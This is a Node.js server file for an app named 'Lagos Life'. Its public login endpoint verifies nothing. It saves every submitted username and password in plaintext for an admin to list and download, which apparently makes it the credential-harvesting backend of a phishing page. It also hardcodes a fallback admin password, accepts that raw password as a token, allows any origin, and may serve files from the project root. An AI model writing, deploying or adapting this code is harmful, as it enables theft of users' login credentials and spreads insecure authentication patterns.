const http = require('node:http');
const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');
const db = require('./db.js');

// Load .env locally
if (typeof process.loadEnvFile === 'function') {
  try {
    process.loadEnvFile();
  } catch {}
}

const PORT = process.env.PORT || 3001;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Gexture187';

function getExpectedToken() {
  return crypto.createHash('sha256').update(`lagos-admin:${ADMIN_PASSWORD}`).digest('hex');
}

// MIME types dictionary for static files
const MIME_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon'
};

function setCorsHeaders(res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, x-admin-token');
}

function checkAdminAuth(req) {
  const authHeader = req.headers['authorization'] || '';
  const tokenHeader = req.headers['x-admin-token'] || '';
  const expectedToken = getExpectedToken();

  const bearerToken = authHeader.startsWith('Bearer ') ? authHeader.slice(7) : authHeader;
  return bearerToken === expectedToken || tokenHeader === expectedToken || bearerToken === ADMIN_PASSWORD;
}

const server = http.createServer((req, res) => {
  setCorsHeaders(res);

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  const parsedUrl = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
  const pathname = parsedUrl.pathname;

  // 1. Admin Verification: POST /api/admin-auth or /api/auth
  if (req.method === 'POST' && (pathname === '/api/admin-auth' || pathname === '/api/auth')) {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
      try {
        const data = JSON.parse(body || '{}');
        const pass = data.password || data.adminPassword || '';
        if (pass === ADMIN_PASSWORD) {
          const token = getExpectedToken();
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: true, token, message: 'Admin verified.' }));
        } else {
          res.writeHead(401, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: false, error: 'Incorrect admin password.' }));
        }
      } catch (err) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: 'Invalid JSON request.' }));
      }
    });
    return;
  }

  // 2. Public POST: Save user login input into database
  if (req.method === 'POST' && (pathname === '/api/records' || pathname === '/api/login')) {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
      try {
        const data = JSON.parse(body || '{}');
        const input1 = data.input1 ?? data.username ?? '';
        const input2 = data.input2 ?? data.password ?? '';

        if (!input1 || !input2) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: false, error: 'Both input fields are required.' }));
          return;
        }

        db.addRecord(input1, input2);
        console.log(`[DB] Saved record: input1="${input1}", input2="***"`);

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          success: true,
          message: 'Saved to database successfully!',
          driver: db.getDriver()
        }));
      } catch (err) {
        console.error('[DB Error]', err);
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: 'Failed to save record: ' + err.message }));
      }
    });
    return;
  }

  // Admin Protected endpoints: GET and DELETE require admin token
  if ((req.method === 'GET' || req.method === 'DELETE') && pathname.startsWith('/api/records')) {
    if (!checkAdminAuth(req)) {
      res.writeHead(401, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: 'Unauthorized: Admin authentication required.' }));
      return;
    }

    if (req.method === 'GET') {
      try {
        const records = db.getRecords();
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true, count: records.length, driver: db.getDriver(), records }));
      } catch (err) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: err.message }));
      }
      return;
    }

    if (req.method === 'DELETE') {
      const parts = pathname.split('/').filter(Boolean);
      const id = parts[2];
      try {
        if (id) {
          db.deleteRecord(id);
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: true, message: `Record #${id} deleted.` }));
        } else {
          db.clearRecords();
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: true, message: 'All records cleared.' }));
        }
      } catch (err) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: err.message }));
      }
      return;
    }
  }

  // Static files handler
  if (req.method === 'GET') {
    let relativePath = pathname === '/' ? 'index.html' : pathname.replace(/^\/+/, '');
    if (relativePath === 'records' || relativePath === 'admin') {
      relativePath = 'records.html';
    }
    const safePath = path.normalize(relativePath).replace(/^(\.\.[\/\\])+/, '');
    let filePath = path.join(__dirname, 'public', safePath);
    if (!fs.existsSync(filePath)) {
      filePath = path.join(__dirname, safePath);
    }

    fs.readFile(filePath, (err, content) => {
      if (err) {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('404 Not Found');
        return;
      }

      const ext = path.extname(filePath).toLowerCase();
      const contentType = MIME_TYPES[ext] || 'application/octet-stream';

      res.writeHead(200, { 'Content-Type': contentType });
      res.end(content);
    });
    return;
  }

  res.writeHead(405, { 'Content-Type': 'text/plain' });
  res.end('Method Not Allowed');
});

// Only start listening when not running on Vercel Serverless
if (!process.env.VERCEL) {
  server.listen(PORT, () => {
    console.log(`🚀 Lagos Life server running at http://localhost:${PORT}`);
    console.log(`🔒 Admin Password configured: ${ADMIN_PASSWORD ? '******' : 'None'}`);
    console.log(`📂 Database driver: ${db.getDriver()}`);
  });
}

module.exports = server;
